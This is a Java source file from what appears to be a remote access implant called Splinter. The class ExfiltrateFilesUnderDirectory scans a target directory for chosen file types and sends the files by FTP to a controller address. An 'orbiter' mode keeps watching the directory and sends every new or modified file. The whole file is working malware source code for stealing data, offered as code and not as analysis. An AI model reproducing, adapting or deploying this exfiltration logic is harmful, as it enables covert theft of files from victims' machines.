/**
 * Abstract class simply to handle exfiltration of files under a given directory
 * 
 * 
 * @author Solomon Sonya
 */

package Implant.Payloads;

import java.io.File;
import java.io.PrintWriter;
import java.util.ArrayList;

import Implant.Driver;
import Implant.Splinter_IMPLANT;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;

public class ExfiltrateFilesUnderDirectory 
{
	private static final String strMyClassName = "ExfiltrateFilesUnderDirectory";
	
	
	
	
	public static ArrayList<File> scanAndExfiltrateFiles(File topFolderToList, String fileTypes, boolean recursively_Search_And_Include_AllSubDirectories_As_Well, ArrayList<File> alCurrFiles_ok_to_be_null, ArrayList alCurrFilesLastModified_ok_to_be_null, Splinter_IMPLANT implant_ok_to_be_null, String FTP_Address, int FTP_Port, boolean orbitDirectoryEngaged)
	{
		try
		{
			if(topFolderToList == null || !topFolderToList.exists())
			{
				return null;
			}
			
			if(fileTypes == null || fileTypes.trim().equals(""))
			{
				fileTypes = "*.*";
			}
			
			if(!fileTypes.contains("."))
			{
				fileTypes = "*." + fileTypes.trim();
			}			
			
			//First get listing of all files in the top folder
			ArrayList<File> alNewFilesUnderDirectory = Driver.listFilesUnderDirectory(topFolderToList, fileTypes, recursively_Search_And_Include_AllSubDirectories_As_Well, null, implant_ok_to_be_null);
			
			if(alNewFilesUnderDirectory == null || alNewFilesUnderDirectory.size() < 1)
			{				
				return alCurrFiles_ok_to_be_null;
			}
			
			//else, determine which files we actually want to keep which match our specifications
			/*for(int i = 0; i < alNewFilesUnderDirectory.size(); i++)
			{
				Driver.sop(alNewFilesUnderDirectory.get(i).getCanonicalPath());
			}*/
						
			//Driver.sop("Size: " + alNewFilesUnderDirectory.size());
			
			//Ok, at this point, we have a complete file listing matching the parameters and filter passed in

			PrintWriter pw = null;
			if(implant_ok_to_be_null != null)
			{
				pw = implant_ok_to_be_null.pwOut;
			}
			
			//check if we're orbiting the directory, or just exfiltrating as specified
			if(!orbitDirectoryEngaged)
			{
				//simply FTP contents over to Controller								
				sendFiles(alNewFilesUnderDirectory, FTP_Address, FTP_Port, pw, FTP_ServerSocket.FILE_TYPE_DATA_EXFIL);
			}
			
			else//orbiter is enabled
			{
				if(alCurrFiles_ok_to_be_null == null)
				{
					//alCurrFiles_ok_to_be_null = new ArrayList<File>();
					//no temp files were created, thus, send all files we just discovered
					sendFiles(alNewFilesUnderDirectory, FTP_Address, FTP_Port, pw, FTP_ServerSocket.FILE_TYPE_ORBITER_PAYLOAD);
					
					//save the new directory listing
					alCurrFiles_ok_to_be_null = alNewFilesUnderDirectory;
				}
				
				else//now compare the new file listing to our old one
				{
					//we only care about the new listing, the only we keep the old (current) listing is to do this comparison to see the new files to send to the controller
					ArrayList<File> alKeeper = new ArrayList<File>();
					File fleKeeper  = null;
					int index = 0;
					for(int i = 0; alCurrFiles_ok_to_be_null != null && i < alNewFilesUnderDirectory.size(); i++)
					{
						fleKeeper = alNewFilesUnderDirectory.get(i);
						
						//check if we have not seen this file yet. if it's new, add it to the list to be exfilled
						if(!alCurrFiles_ok_to_be_null.contains(fleKeeper))
						{
							//new file found, send it!
							alKeeper.add(fleKeeper);
							continue;
						}
						
						else if(alCurrFiles_ok_to_be_null.contains(fleKeeper) && alCurrFilesLastModified_ok_to_be_null != null)
						{
							index = alCurrFiles_ok_to_be_null.indexOf(fleKeeper);
							
							if(index > alCurrFilesLastModified_ok_to_be_null.size() || index < 0)
							{
								continue;
							}
							
							//oooh, we've seen this file before, ok, check if this file has been modified since the last time we saw it
							//ok so this might be a bit confusing, use alCurrFilesLastModified_ok_to_be_null arraylist to store the last modified times of files in alCurrFilesLastModified... we had to store the temp locations previously
							//this check assumes elements in alCurrFiles_ok_to_be_null are at the same index as their last modified times in alCurrFilesLastModified_ok_to_be_null
							if(fleKeeper.lastModified() > Long.parseLong((alCurrFilesLastModified_ok_to_be_null.get(index)).toString()))
							{
								//excellent, we found a file that has been modified more rescent than previously
								alKeeper.add(fleKeeper);
								continue;
							}
						}
					}//end for loop
					
					//determine if we're sending anything
					if(alKeeper.size() > 0)
					{
						sendFiles(alKeeper, FTP_Address, FTP_Port, pw, FTP_ServerSocket.FILE_TYPE_ORBITER_PAYLOAD);
					}
					
					//save the new directory listing
					alCurrFiles_ok_to_be_null = alNewFilesUnderDirectory;
				}
			}
			
			
			
			return alCurrFiles_ok_to_be_null;
		}
		catch(Exception e)
		{
			Driver.eop("scanAndExfiltrate", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return alCurrFiles_ok_to_be_null;
	}
	
	public static boolean sendFiles(ArrayList<File> alFilesToSend, String FTP_Address, int FTP_Port, PrintWriter pwOut, String FTP_SERVER_TYPE)
	{
		try
		{
			if(alFilesToSend == null || alFilesToSend.size() < 1)
			{
				return false;
			}
			
			File fle = null;
			
			double steps = 0;
			
			//for some reason, it is 1/2 if recursion is used, therefore, compensate for this difference
			try	{ steps = (double)(100.0/(alFilesToSend.size()));} catch(Exception e){steps = -1;}

			
			//track file sending progress
			IncrementObject fileTransferStatus = new IncrementObject(steps);
			
			for(int i = 0; i < alFilesToSend.size(); i++)
			{
				fle = alFilesToSend.get(i);
				
				if(fle == null || !fle.exists() || !fle.isFile())
				{
					fileTransferStatus.incrementStep();
					continue;
				}
				
				FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Address, FTP_Port, FTP_ServerSocket.maxFileReadSize_Bytes, fle, pwOut, false, FTP_SERVER_TYPE, fileTransferStatus);
				FTP_Sender.start();
				
				
			}
			
			Driver.sop("\nScheduling complete: " + alFilesToSend.size() + " files queued for transfer");
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendFiles", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
}
